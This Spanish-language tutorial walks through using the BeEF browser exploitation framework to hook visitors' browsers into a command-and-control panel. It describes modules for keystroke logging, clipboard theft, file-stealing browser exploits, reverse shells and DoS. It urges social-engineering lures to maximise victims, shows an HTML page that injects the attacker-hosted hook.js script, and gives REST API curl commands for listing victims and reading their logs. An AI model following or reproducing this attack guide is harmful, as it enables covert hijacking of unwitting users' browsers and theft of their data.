# Comprometer maquinas a travez de browser

Herramientas
- Linux
- BeEF Framework
- Servidor web local (para el ejemplo)

La herramienta principal que usaremos en este caso sera BeEF, pero y que es BeEF? BeEF es la abreviatura de "*The Browser Exploitation Framework*", la cual es una herramienta usada para el pentesting centrado en navegador web. En medio de la creciente preocupación por los ataques en la web contra clientes, incluyendo clientes móviles, BeEF permite al pentester evaluar la seguridad de un objetivo mediante ataques de vectores por el lado del cliente. BeEF examina la explotabilidad dentro del contexto de una puerta abierta (agujero en el servidor): el web browser. BeEF conectará uno o más navegadores web y los usará como "beachheads" para lanzar módulos de comandos dirigidos y ataques adicionales contra el sistema desde el contexto del navegador.

## Funcionamiento de BeEF

Beef, a diferencia de otras herramientas de pentesting web, se centra en el contexto de los clientes y utilizando un hook en Javascript, permite crear una red de bots que pueden ser controlados desde un panel de control central. Basta con que un usuario navegue por un sitio web que contenga dicho hook para que automáticamente haga parte de esa red de bots. Hay que tener en cuenta que dicho hook no explota ninguna vulnerabilidad 0day sobre los navegadores web o cosas similares, sino que simplemente incluye varias rutinas desarrolladas en Javascript que realizan peticiones contra el panel de control de Beef y desde dicho panel de control, se pueden enviar instrucciones al hook para que realice tareas sobre el entorno (navegador web) de la víctima, de esta forma es posible acceder a información básica del navegador web, activar o desactivar plugins y extensiones o incluso forzar la navegación hacia sitios web arbitrarios, obviamente sin la debida autorización por parte de la víctima. La siguiente imagen enseña la arquitectura de Beef y como se puede ver, se compone por un servidor centrar del C&C y una serie de zombies que se encuentran “infectados” por el hook. Ahora bien, esta supuesta “infección” no es persistente ni mucho menos, ya que se trata simplemente de un fichero Javascript se ejecuta en el contexto de la página web visitada por la víctima, basta con cerrar dicha página web y problema resuelto.

![BeEF arquitectura](https://thehackerway.files.wordpress.com/2015/07/beefarchitecture.png "BeEF arquitectura")

La imagen anterior ha sido tomada del sitio web oficial de Beef y se puede apreciar perfectamente el funcionamiento de la herramienta que es simple y a su vez muy potente.
Cuando una víctima accede a una página web que contiene el hook y a menos que exista algún bloqueo de las peticiones HTTP entre el C&C de Beef y la víctima, aparecerá automáticamente en el panel de control un nuevo bot.
A partir de aquí, es el momento de establecer el vector de ataque. Debes crear una página web que incluya el script “hook.js” y evidentemente, entre mejor elaborado sea dicho vector, mejores resultados (+ víctimas) lograrás conseguir. Aquí entra en juego la creatividad y definir quien o quienes van a ser los objetivos del ataque, de tal forma que puedas ofrecer algo que tus víctimas potenciales puedan querer y les invite a entrar y permanecer en el sitio web que ejecuta el hook, aquí las técnicas de ingeniería social son vitales y ofrecer un servicio perfectamente “legitimo” como un juego online o algún servicio web concreto, puede ser lo suficientemente atractivo para la víctima como para que decida visitar el sitio y permanecer en él algún tiempo.

Cuando una víctima accede a la página web maliciosa, automáticamente se convierte en un bot del C&C de Beef, tal como se enseña en la siguiente imagen.

![BeEF arquitectura](https://thehackerway.files.wordpress.com/2015/07/victimbeef.png "BeEF C&C")

## Concepto de zombies

En Beef el concepto de “Zoombie” se refiere a un cliente (de ahora en adelante, Zoombie es equivalente a navegador web de la víctima) que ha sido objeto de un ataque XSS apoyado por Beef, para que esto pueda ser llevado a cabo, es necesario que en primera instancia, el script correspondiente a la inyección de código XSS sea el que beef proporciona al momento de arracar (Hook). Posteriormente, el script que enseñe beef en dicha opción es el que debe de ser inyectado en el zoombie, actualmente dicho script es este: **<script src=”http://localhost/beef/hook/beefmagic.js.php“></script>**

Por otro lado, otras de las características interesantes es la posibilidad de ver en tiempo real las teclas ingresadas por el Zoombie, así como la página que se encuentra visualizando en todo momento, lo que sin lugar a dudas es una característica sumamente interesante.

## Modulos Estandar

Los módulos estándar son útiles para la detección de software instalado, módulos y demás características en un Zoombie, consisten en el envió de determinadas peticiones a la víctima (zoombie) por medio del puente establecido gracias a la vulnerabilidad XSS explotada, es muy útil para recolectar información y/o otras actividades que si no son utilizadas de forma responsable, pueden hacer sospechar a la víctima. Los módulos estándar en Beef son:
Alert Dialog: Consiste en el envió de un alert JavaScript con un texto personalizado al Zoombie seleccionado

- **Clipboard Theft**: Intenta capturar el “tablón” de copias del zoombie con el fin de acceder a documentos y elementos que se han copiado allí.

- **Deface Web Page**: Intenta escribir un mensaje de texto personalizado en el contexto de la pagina del zoombie.

- **Detect Flash**: Intenta determinar si el zoombie soporta flash y la versión que tiene instalada, el resultado puede verse en el panel de la derecha de la interfaz de administración en la sección de “Log Summary junto con todos los demás mensajes que han salido por log”

- **Detect Java**: Intenta determinar si el zoombie soporta Java y la versión que tiene instalada, el resultado puede verse en el panel de la derecha de la interfaz de administración en la sección de “Log Summary junto con todos los demás mensajes que han salido por log”

- **Detect Plugins**: Intenta determinar los plugins que soporta el zoombie, el resultado puede verse en el panel de la derecha de la interfaz de administración en la sección de “Log Summary” junto con todos los demás mensajes que han salido por log

- **Detect QuickTime**: Determina si QuickTime se encuentra instalado en el zoombie seleccionado

- **Detect Software**: Intenta determinar que software se encuentra instalado en el zoombie (en el caso de que existan extensiones de terceras partes instaladas).

- **Detect Unsafe ActiveX**: Intenta determinar si el navegador objetivo tiene políticas de seguridad mal configuradas en los controles ActiveX, como resulta claro, esto solamente es valido todas las versiones de Internet Exporer.

- **Detect VBScript**: Intenta determinar si Visual Basic Script es soportado por el zoombie.

- **Detect Virtual Machine**: Intenta determinar si el zoombie se encuentra en una maquina virtual.

- **Prompt Dialog**: Enviá un mensaje al zoombie esperando que ingrese un valor, la respuesta del usuario sera almacenada en los log de la aplicación.

- **Raw Script Module**: Se trata de una característica muy interesante, ya que permite al atacante ingresar código JavaScript y enviarlo directamente al Zoombie aprovechando en puente XSS creado.

- **Rewrite Status Bar**: Como su nombre lo indica, intenta escribir el texto que aparecerá en la barra de estatus del Zoombie seleccionado

## Modulos de red

Se trata de módulos un poco mas complejos, enfocados en la conectividad y acceso a recursos por medio del Zoombie, las opciones que incluye beef en este apartado son:

- Ejecución de exploit sobre Asterisk 1.0.7
- Detección de Tor en el Zoombie
- Detección de nombre de host en el Zoombie
- Detección de dirección IP en zoombie
- Detección de sitios web visitados en función a un listado de sitios web  proporcionados
- Escaner de puertos distribuidos utilizando el Zoombie como pivote.
- Redirección del Zoombie a una URL determinada
- Petición de Browser, consiste en crear un iframe y enviar una petición a la URL especificada.
- Bindshell IPC, bastante útil para acceder a maquinas correspondientes a una intranet que no se encuentran accesibles desde internet, pero si desde la maquina zoombie, de esta forma es posible ejecutar comandos sobre el Zoombie.
- IMAP4 IPC, similar al anterior, sin embargo, en este caso, el Zoombie servirá de pivote para enviar comando a un servidor IMAP4 que posiblemente no se encuentra accesible desde internet, pero si desde el Zoombie.
- Vtiger CRM upload exploit, crea un puente reverso a una consola de la maquina del atacante.

## Modulos Browser

Se trata de módulos ejecutados contra el Zoombie en busca de explotar vulnerabilidades generales que afectar a determinados navegadores, por lo tanto en algunos casos, algunas de las opciones de este menú pueden ser de utilidad, mientras que otras simplemente no aplican para determinados Zoombies, por ejemplo, las primeras opciones se relacionan con exploits contra Internet Explorer, si el zoombie es un navegador FireFox, Safari, Chrome u otro, algunas de las opciones en esta categoría son:

- CVE-2006-3730, se trata de la vulnerabilidad en IExplorer sobre el objeto WebViewFolderIcon, donde se trata de ejecutar el programa calc.exe
- MS09-002, Se trata de una vulnerabilidad en IExplorer 7, que abusa de la stack de memoria del programa, terminando en un exploit de corrupción de memoria, el objetivo de este modulo es sobre windows XP SP2, si este exploit tiene éxito, iniciara una consola reversa escuchando sobre el puerto 28879.
- CVE-2009-0137, vulnerabilidad en Safari, cuya explotación termina en robo de ficheros del sistema de archivos, en windows el fichero robado sera C:\windows\win.ini y en Linux o Mac /etc/passwd
- DoS Chrome, como su nombre lo indica, intenta de ejecutar un ataque de denegación de servicio contra un Zoombie Chrome, explotando una vulnerabilidad de abuso de memoria contra dicho navegador.
- DoS Firefox, Ejecuta un dialogo sobre el zoombie que se repite un numero indefinido de veces
- DoS Generic, Ataque de denegación de servicio que puede afectar a un gran numero de navegadores.
- Malicious Java Applet, se trata de un applet que ejecuta un comando ingresado por el atacante contra la maquina del cliente.
- Mozilla nsIProcess XPCOM Interface (WINDOWS), Representa un proceso ejecutable, en este modulo, nsIProcess es combinado con la consola cmd.exe de Windows. Cualquier inyección XSS permite ejecutar comando arbitrarios en maquina de la victima.

Finalmente, en esta sección se encuentran módulos específicos de integración con MetaSploit Framework, en donde se pueden utilizar las potencialidades de metasploit junto con las herramientas de Beef.

## Basico

### PASO 1

Si usamos kali, BeEF es una herramienta que ya viene por defecto en el sistema, de otro modo, deberan instalarlo con alguna guia oficial de internet.
Asumiento que ya lo tienen instalado, en una terminal haremos lo siguiente:

    $ systemctl start apache2

Luego abriendo el navegador web, ingresamos a la direcion 127.0.0.1:3000/ui/panel . Esta direccion corresponde al localhost y ya que hemos iniciado beef se nos abrira un loguin para la consola de administracion, con username "beef" y password "beef" (sin comillas ambos).

### Paso 2

Tieniendo abierta la interfaz tenemos dos areas, la d ela izquierda nos muestra el estado de los navegadores web que tenemos conectados (o infectados luego de un ataque) y la parte de la derecha nos ira mostrando opciones de acuerdo a lo que queramos hacer con el framework.
Ahora podemos tener acceso a alguno de lo javascript que nos provee Beef, para este caso veremos un ejemplo de script llamado hook.js y para acceder a el solo debemos poner en el navegador 127.0.0.1:3000/hook.js. Con esto tendremos acceso al codigo y podemos copiarlo con algun editor de texto que nos acomode.

Ahora supongamos que tenemos un servidor web al que usualmente la gente se conecta para leer informacion etc. Teniendo este escript en .js podemos hacer que la gente al momento de conectarse a la pagina se ejecute automaticamente injectando codigo malicioso. Veamos un ejemplo de un html sensillo donde se injecta el codigo:

 ```html
 <html>
  <header>
    <title>
      This is title
    </title>
  </header>
  <body>
    Hello world
    <script src="CARPETA/DONDE/ESTA/EL/CODIGO/hook.js" type="text/javascript">
    </script>
  </body>
 </html>
 ```

 tambien en *src* es posible poner una direccion ip o pagina donde este alojado el script.

### Paso 3

Ya teniendo en nuestra pagina puesta el codigo malicioso, cada vez que alguien ingrese a ella beef deberia guardar la direccion ip de la conexion con todos sus datos, de tal forma que pudiesemos descubrir vulnerabilidades para el uso de diferentes exploits.

------------------------------------------------------------------------------

## Avanzado

Fuente: https://thehackerway.com/2015/07/14/pentesting-automatizado-con-beef-y-su-api-rest-parte-1/

Ahora viene la parte divertida, Beef cuenta con una API Rest que permite la automatización de tareas, algo que desde luego viene muy bien cuando se deben gestionar múltiples víctimas y resulta muy ineficiente (y tedioso) hacerlo desde la interfaz web. Su uso es bastante simple y como se ha visto en líneas anteriores, solamente es necesario contar con la API Key que genera la herramienta de forma automática cuando se levanta Beef. Con dicha API Key se pueden invocar los endpoints definidos en la API y de esta forma, obtener información del C&C de Beef en formato JSON. Para hacer pruebas simples se puede utilizar una herramienta con CURL o WGET y posteriormente, utilizar un lenguaje como Python o Ruby para crear rutinas que permitan invocar múltiples endpoints y hacer cosas mucho más interesantes.

*Obtener el listado de víctimas*

    $ curl http://localhost:3000/api/hooks?token=4ecc590cb776484412492a7bd3f0ad03cd47660

Como se puede ver, aparecen los bots que salen en el panel de control de Beef y en este caso, cada “hooked-browser” puede encontrarse online u offline y cuenta con un identificador (atributo “session”) que puede ser utilizado para realizar consultas contra ese bot concreto como por ejemplo…

*Recuperar los detalles del navegador web de un bot concreto*

    $ curl http://localhost:3000/api/hooks/ZHHT3vCTs9NRDvSmtoiWs0GfgjJYBNRctWlhx5aJKtwczH7klN6fmInMZi0K9hxirSZm56TRRD4OaqHi?token=4ecc590cb776484412492a7bd3f0ad03cd47660a

En este caso, el valor “session” del bot nos permite acceder a todos los detalles del navegador web de la víctima, algo que puede ser utilizado para posteriormente ejecutar ataques dirigidos contra dicho bot.

*Accediendo a los logs de un bot*

    $ curl http://localhost:3000/api/logs/ZHHT3vCTs9NRDvSmtoiWs0GfgjJYBNRctWlhx5aJKtwczH7klN6fmInMZi0K9hxirSZm56TRRD4OaqHi?token=4ecc590cb776484412492a7bd3f0ad03cd47660a

También se puede acceder a los logs de que se han producido para un bot concreto, nuevamente partiendo del valor “session” del bot en cuestión.

*Listando los módulos disponibles en Beef*

    $ curl http://localhost:3000/api/modules?token=4ecc590cb776484412492a7bd3f0ad03cd47660a


Listar los módulos desde la API Rest no tiene mayores beneficios, ya que es lo mismo que se puede hacer desde el navegador web accediendo directamente al panel de administración, sin embargo si que es importante obtener el identificador de cada módulo para poder ejecutarlo contra uno o varios bots de forma programática, dicho identificador se puede obtener de la respuesta a la invocación del servicio anterior.

Existen muchos más endpoints en la API Rest de Beef que se encuentran documentados en el siguiente enlace: https://github.com/beefproject/beef/wiki/BeEF-RESTful-API y que nos permitirá acceder a todos los detalles de configuración del panel de Beef y controlar programáticamente todas las víctimas capturadas, algo que desde luego resulta muy interesante y que veremos en el próximo artículo utilizando Python.
